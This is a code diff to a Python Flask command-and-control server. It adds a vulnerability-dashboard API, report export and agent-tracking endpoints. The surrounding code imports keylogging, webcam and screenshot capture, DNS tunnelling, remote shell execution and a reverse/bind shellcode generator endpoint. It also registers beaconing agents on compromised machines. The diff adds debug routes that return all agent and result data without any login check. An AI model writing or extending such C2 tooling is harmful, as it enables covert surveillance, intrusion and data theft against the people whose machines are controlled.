@@ -17,7 +17,7 @@ from werkzeug.security import check_password_hash
 
 # Configure logging
 logging.basicConfig(
-    level=logging.INFO,
+    level=logging.DEBUG,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
         logging.FileHandler('c2_server.log'),
@@ -31,7 +31,7 @@ if MODULES_PATH not in sys.path:
     sys.path.append(MODULES_PATH)
 
 # Import modules
-from modules.shellcode import ShellcodeGenerator
+from shellcode_generator import ShellcodeGenerator
 from modules.dns_tunnel.tunnel import DNSTunnel, create_server
 from modules.system import get_info
 from modules.process import list_processes, kill_process
@@ -39,6 +39,9 @@ from modules.surveillance import take_screenshot, capture_webcam, start_keylogge
 from modules.files import list_directory, get_file_info, read_file, write_file, delete_file
 from modules.shell import execute
 from models import User, users
+
+# Import vulnerability dashboard
+from vulnerability_dashboard import dashboard
 
 # Initialize Flask app
 app = Flask(__name__)
@@ -85,7 +88,12 @@ def logout():
 @app.route('/')
 @login_required
 def index():
-    return render_template('index.html')
+    return render_template('dashboard.html')
+
+@app.route('/dashboard')
+@login_required
+def dashboard_page():
+    return render_template('dashboard.html')
 
 @app.route('/shellcode')
 @login_required
@@ -96,6 +104,192 @@ def shellcode():
 @login_required
 def control():
     return render_template('control.html')
+
+# New API endpoints for vulnerability dashboard
+@app.route('/api/dashboard')
+@login_required
+def get_dashboard_data():
+    """Get dashboard data for the vulnerability assessment dashboard"""
+    try:
+        dashboard_data = dashboard.get_dashboard_data()
+        
+        # Merge agent data from global agents dictionary
+        total_agents = len(agents)
+        active_agents = 0
+        current_time = datetime.now()
+        
+        # Count active agents from global agents dictionary
+        for agent_data in agents.values():
+            if 'last_seen' in agent_data:
+                try:
+                    last_seen = datetime.fromisoformat(agent_data['last_seen'])
+                    if current_time - last_seen < timedelta(minutes=5):
+                        active_agents += 1
+                except:
+                    pass
+        
+        # Ensure dashboard_data has required structure
+        if not dashboard_data:
+            dashboard_data = {}
+        if 'summary' not in dashboard_data:
+            dashboard_data['summary'] = {}
+        
+        # Update the summary with actual agent counts and activity
+        dashboard_data['summary']['total_agents'] = max(total_agents, dashboard_data['summary'].get('total_agents', 0))
+        dashboard_data['summary']['active_agents'] = max(active_agents, dashboard_data['summary'].get('active_agents', 0))
+        dashboard_data['summary']['total_vulnerabilities'] = dashboard_data['summary'].get('total_vulnerabilities', 0)
+        dashboard_data['summary']['overall_risk_score'] = dashboard_data['summary'].get('overall_risk_score', 0)
+        
+        # Add agent activity data
+        agent_activity = []
+        task_count = 0
+        for agent_id, agent_data in agents.items():
+            activity = {
+                'agent_id': agent_id,
+                'hostname': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
+                'last_seen': agent_data.get('last_seen', 'Never'),
+                'status': agent_data.get('status', 'Unknown'),
+                'platform': agent_data.get('system_info', {}).get('platform', 'Unknown'),
+                'task_count': len(agent_data.get('results', {}))
+            }
+            agent_activity.append(activity)
+            task_count += activity['task_count']
+        
+        dashboard_data['agent_activity'] = agent_activity
+        dashboard_data['summary']['total_tasks'] = task_count
+        
+        return jsonify({
+            'status': 'success',
+            'data': dashboard_data
+        })
+    except Exception as e:
+        logging.error(f"Error getting dashboard data: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'error': str(e)
+        }), 500
+
+@app.route('/api/vulnerabilities')
+@login_required
+def get_vulnerabilities():
+    """Get all vulnerabilities with optional filtering"""
+    try:
+        filters = request.args.to_dict()
+        vulnerabilities = dashboard.get_vulnerabilities(filters)
+        return jsonify({
+            'status': 'success',
+            'vulnerabilities': vulnerabilities
+        })
+    except Exception as e:
+        logging.error(f"Error getting vulnerabilities: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'error': str(e)
+        }), 500
+
+@app.route('/api/agents')
+@login_required
+def get_agents():
+    """Get all agents with their data"""
+    try:
+        agents_data = []
+        for agent_id, agent_data in agents.items():
+            # Create a summary of the agent data
+            agent_summary = {
+                'agent_id': agent_id,
+                'last_seen': agent_data.get('last_seen', 'Unknown'),
+                'status': agent_data.get('status', 'Unknown'),
+                'system_info': agent_data.get('system_info', {}),
+                'results_count': len(agent_data.get('results', {}))
+            }
+            
+            # Add vulnerability data if available from dashboard
+            if agent_id in dashboard.agents:
+                dashboard_summary = dashboard.get_agent_summary(agent_id)
+                if dashboard_summary:
+                    agent_summary.update({
+                        'risk_score': dashboard_summary.get('risk_score', 0),
+                        'total_vulnerabilities': dashboard_summary.get('total_vulnerabilities', 0),
+                        'vulnerability_breakdown': dashboard_summary.get('vulnerability_breakdown', {})
+                    })
+            
+            agents_data.append(agent_summary)
+        
+        return jsonify({
+            'status': 'success',
+            'agents': agents_data
+        })
+    except Exception as e:
+        logging.error(f"Error getting agents: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'error': str(e)
+        }), 500
+
+@app.route('/api/reports')
+@login_required
+def get_reports():
+    """Get all generated reports"""
+    try:
+        reports = list(dashboard.reports.values())
+        return jsonify({
+            'status': 'success',
+            'reports': reports
+        })
+    except Exception as e:
+        logging.error(f"Error getting reports: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'error': str(e)
+        }), 500
+
+@app.route('/api/reports/generate', methods=['POST'])
+@login_required
+def generate_report():
+    """Generate a new vulnerability report"""
+    try:
+        data = request.get_json()
+        report_type = data.get('type', 'comprehensive')
+        
+        report = dashboard.get_vulnerability_report(report_type)
+        
+        return jsonify({
+            'status': 'success',
+            'report': report
+        })
+    except Exception as e:
+        logging.error(f"Error generating report: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'error': str(e)
+        }), 500
+
+@app.route('/api/reports/<report_id>/download')
+@login_required
+def download_report(report_id):
+    """Download a report in specified format"""
+    try:
+        format_type = request.args.get('format', 'json')
+        export_result = dashboard.export_report(report_id, format_type)
+        
+        if export_result['status'] == 'success':
+            if format_type == 'json':
+                return jsonify(export_result['data'])
+            elif format_type == 'csv':
+                return Response(
+                    export_result['data'],
+                    mimetype='text/csv',
+                    headers={'Content-Disposition': f'attachment;filename=report_{report_id}.csv'}
+                )
+        else:
+            return jsonify(export_result), 400
+            
+    except Exception as e:
+        logging.error(f"Error downloading report: {str(e)}")
+        return jsonify({
+            'status': 'error',
+            'error': str(e)
+        }), 500
 
 @app.route('/api/generate_shellcode', methods=['POST'])
 def generate_shellcode():
@@ -121,7 +315,7 @@ def generate_shellcode():
             port = int(data.get('port', 0))
             if not host or not port:
                 return jsonify({'success': False, 'error': 'Host and port are required'}), 400
-            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform, msf_payload)
+            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)
 
         elif shellcode_type == 'bind':
             port = int(data.get('port', 0))
@@ -158,6 +352,24 @@ def generate_shellcode():
 def list_agents():
     return jsonify(list(agents.values()))
 
+@app.route('/api/debug/agents')
+def debug_agents():
+    """Debug endpoint to check agent registration"""
+    return jsonify({
+        'agents_count': len(agents),
+        'agents': agents,
+        'dashboard_agents_count': len(dashboard.agents),
+        'dashboard_agents': list(dashboard.agents.keys())
+    })
+
+@app.route('/api/debug/results')
+def debug_results():
+    """Debug endpoint to check results structure"""
+    return jsonify({
+        'results_count': len(results),
+        'results': results
+    })
+
 @app.route('/api/agents/register', methods=['POST'])
 def register_agent():
     try:
@@ -178,6 +390,13 @@ def register_agent():
                 agents[agent_id] = data
                 agents[agent_id]['last_seen'] = datetime.now().isoformat()
                 agents[agent_id]['results'] = {}
+
+            # Process vulnerability data if present
+            if 'vulnerabilities' in data or 'scan_type' in data:
+                try:
+                    dashboard.process_vulnerability_data(agent_id, data)
+                except Exception as e:
+                    logging.error(f"Error processing vulnerability data: {str(e)}")
 
             logging.info(f"Registered agent: {agent_id}")
             return jsonify({'status': 'success'})
@@ -204,6 +423,11 @@ def agent_beacon():
         if agent_id:
             if agent_id in agents:
                 agents[agent_id]['last_seen'] = timestamp
+                agents[agent_id]['status'] = data.get('status', 'online')
+                # Update system info if provided
+                if 'system_info' in data:
+                    agents[agent_id]['system_info'] = data.get('system_info')
+                logging.debug(f"Updated existing agent {agent_id}: {agents[agent_id]}")
             else:
                 agents[agent_id] = {
                     'agent_id': agent_id,
@@ -212,6 +436,16 @@ def agent_beacon():
                     'last_seen': timestamp,
                     'results': {}
                 }
+                logging.debug(f"Created new agent {agent_id}: {agents[agent_id]}")
+            
+            logging.debug(f"Total agents in dictionary: {len(agents)}")
+
+            # Process vulnerability data if present
+            if 'vulnerabilities' in data or 'scan_type' in data:
+                try:
+                    dashboard.process_vulnerability_data(agent_id, data)
+                except Exception as e:
+                    logging.error(f"Error processing vulnerability data in beacon: {str(e)}")
 
             logging.info(f"Beacon received from {agent_id}")
             return jsonify({'status': 'ok', 'message': 'Beacon received'})
@@ -389,6 +623,10 @@ def receive_result():
                 'status': data.get('status', 'success')
             }
 
+        # Process vulnerability data if present
+        if 'vulnerabilities' in result or 'scan_type' in result:
+            dashboard.process_vulnerability_data(agent_id, result)
+
         logging.info(f"Successfully stored result from agent {agent_id} for task {task_id}")
         return jsonify({'status': 'success'})
 
@@ -489,4 +727,4 @@ def download_result(task_id):
     return 'Result not found', 404
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5001)
+    app.run(host="0.0.0.0", port=5000)
